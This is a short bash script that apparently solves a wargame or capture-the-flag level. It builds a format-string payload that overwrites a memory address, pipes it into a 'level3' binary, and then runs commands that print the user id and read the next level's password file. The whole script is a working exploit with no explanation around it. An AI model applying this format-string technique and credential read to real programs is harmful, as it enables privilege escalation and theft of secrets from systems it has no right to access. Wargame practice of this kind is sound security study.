#!/bin/bash

GETPASS="cat /home/user/level4/.pass"

set -x

python -c 'print "\x8c\x98\x04\x08%60x%4$n"' > /tmp/exploit

(cat /tmp/exploit - | ~/level3) << EOI
    echo "\nid: \$(id)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI